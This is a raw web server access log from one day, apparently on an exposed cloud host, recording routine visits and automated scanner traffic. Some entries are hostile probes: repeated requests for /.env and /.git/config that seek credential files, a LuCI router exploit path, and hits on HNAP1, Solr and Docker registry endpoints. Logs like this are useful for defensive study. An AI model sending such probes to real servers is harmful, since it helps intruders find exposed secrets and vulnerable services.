112.173.214.203 - - [15/Jan/2025:11:55:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
213.136.86.135 - - [15/Jan/2025:12:24:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
213.136.86.135 - - [15/Jan/2025:12:28:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:12:32:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.156.33 - - [15/Jan/2025:12:35:10 +0000] "\x16\x03\x01" 400 524 "-" "-"
57.129.64.237 - - [15/Jan/2025:13:16:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
206.168.34.63 - - [15/Jan/2025:13:25:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.63 - - [15/Jan/2025:13:26:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:07 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:10 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.63 - - [15/Jan/2025:13:26:11 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:13:36:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [15/Jan/2025:13:37:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
66.240.223.202 - - [15/Jan/2025:13:43:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
139.162.71.210 - - [15/Jan/2025:13:50:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
171.7.112.57 - - [15/Jan/2025:13:50:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:14:08:04 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
179.43.191.146 - - [15/Jan/2025:14:18:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [15/Jan/2025:14:56:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.128.129 - - [15/Jan/2025:15:52:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
178.215.236.132 - - [15/Jan/2025:15:54:02 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49"
139.59.101.104 - - [15/Jan/2025:16:00:00 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.149 - - [15/Jan/2025:16:01:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:16:01:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
47.237.115.100 - - [15/Jan/2025:16:21:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
185.10.68.236 - - [15/Jan/2025:16:52:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
3.16.66.182 - - [15/Jan/2025:16:53:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
3.16.66.182 - - [15/Jan/2025:16:54:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
5.181.190.248 - - [15/Jan/2025:17:19:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:17:19:19 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:17:27:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:27:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:38:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:38:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:19:30:12 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:19:30:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.141 - - [15/Jan/2025:19:41:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
31.13.224.222 - - [15/Jan/2025:19:45:19 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
172.105.128.13 - - [15/Jan/2025:19:45:36 +0000] "\x16\x03\x01" 400 524 "-" "-"
46.19.138.234 - - [15/Jan/2025:20:17:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [15/Jan/2025:20:34:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:20:34:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [15/Jan/2025:20:43:13 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3887.0 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:21:02:21 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [15/Jan/2025:21:22:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [15/Jan/2025:21:31:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
5.181.190.248 - - [15/Jan/2025:22:10:15 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:22:10:15 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
95.214.53.198 - - [15/Jan/2025:22:17:00 +0000] "GET /cgi-bin/getwifiattr.cgi HTTP/1.1" 302 350 "-" "Linux Gnu (cow)"
106.244.171.70 - - [15/Jan/2025:22:24:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /odinhttpcall1736979894 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.226.112.47 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.133.141 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.245.159 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01" 400 524 "-" "-"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01\x01$\x01" 400 524 "-" "-"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/v2/_catalog" "Go-http-client/1.1"
167.99.252.100 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
167.99.245.13 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
134.209.245.159 - - [15/Jan/2025:22:24:54 +0000] "\x16\x03\x01" 400 524 "-" "-"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/solr/admin/info/system" "Go-http-client/1.1"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
157.230.119.87 - - [15/Jan/2025:22:24:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:22:24:55 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:22:24:55 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/favicon.ico" "Go-http-client/1.1"
::1 - - [15/Jan/2025:22:25:01 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
74.103.139.47 - - [15/Jan/2025:22:34:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [15/Jan/2025:22:50:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:22:50:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:23:27:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:23:27:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
147.185.132.45 - - [15/Jan/2025:23:45:57 +0000] "\x16\x03\x01" 400 524 "-" "-"
147.185.132.45 - - [15/Jan/2025:23:45:57 +0000] "\x16\x03\x01" 400 524 "-" "-"
